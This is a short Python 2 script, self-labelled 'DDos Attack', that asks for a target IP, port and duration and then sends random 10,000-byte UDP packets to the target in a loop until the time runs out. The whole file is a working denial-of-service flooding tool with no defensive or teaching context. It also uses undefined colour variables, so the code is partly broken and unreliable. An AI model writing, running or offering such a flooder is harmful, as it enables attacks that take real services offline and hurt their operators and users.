import os
import socket
import time 
import random
import sys


def doss():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payloads = random._urandom(10000)
    
    os.system("apt-get install figlet")
    os.system("clear")
    os.system("figlet DDos Attack")
    ip = raw_input(yl+"[*] ip or host Target : ")
    port = input(wi+"[*] port [Default port 80 ] :")
    seconds = input(rd+"[*] time the Attack : ")
    timeout = time.time() + seconds

    sent = 10 

    while True:

        try:

            if time.time() > timeout:
                break

            else:
                pass
            sock.sendto(payloads,(ip,port))
            sent = sent + 1 
            print ' DDoss Attack starting on %s .... ' % (ip)
        except KeyboardInterrupt:
            sys.exit()

doss()
